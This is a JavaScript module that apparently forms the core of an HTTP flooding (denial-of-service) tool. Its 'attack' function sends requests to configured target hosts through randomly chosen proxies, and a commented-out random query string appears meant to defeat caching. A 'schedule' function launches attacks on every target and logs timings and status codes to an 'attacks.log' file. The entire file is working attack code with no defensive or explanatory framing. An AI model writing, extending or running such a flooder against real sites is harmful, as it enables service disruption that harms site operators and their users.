const config = require('./config');
const { ASCIIAlphabet } = require('./constants');
const { request } = require('./http');
const { createWriteStream } = require('fs');
const { join } = require('path');
const { randomString, randomInt, randomItem } = require('./random');

function randomQueryString() {
    const key = randomString(ASCIIAlphabet, 2 + randomInt(8))
    const value = randomString(ASCIIAlphabet, 2 + randomInt(16))
    return `${key}=${value}`
}

const track = createWriteStream(config.logfile || join(config.currentdir, 'attacks.log'))

let writeLogIntervalTimer = -1
let logEntries = []

function writeLog(...args) {
    if (writeLogIntervalTimer < 0) {
        registerTimer()
    }
    logEntries.push(Array.from(args).join('\t').trim())
}

function registerTimer() {
    writeLogIntervalTimer = setInterval(function() {
        if (logEntries.length > 0) {
            const entries = logEntries
            logEntries = []
            track.write(entries.join('\n') + '\n')
        }
    }, config.writeLogInterval)
}

const promises = {}

async function attack(target) {
    let message
    const statred = new Date()
    let duration = 0
    let statusCode = 0
    try {
        const queryString = randomQueryString()
        const promise = request({
            // url: `${config.onlyProtocol}//${target.host}/?${queryString}`,
            url: `${config.onlyProtocol}//${target.host}/`,
            timeout: config.timeout,
            proxy: randomItem(config.proxies)
        })
        const res = await promise
        statusCode = res.status || 0
        duration = Date.now() - statred.getTime()
    } catch (err) {
        message = err.message
        throw err
    } finally {
        writeLog(
            statred.toISOString(),
            target.host,
            duration,
            statusCode,
            message ? JSON.stringify(message) : ''
        )
    }
}

function schedule() {
    for(const target of Object.values(config.targets)) {
        if (!promises[target.host]) {
            promises[target.host] = []
        }
        promises[target.host].push(attack(target))
    }
}

module.exports = { attack, schedule, attackPromises: promises }
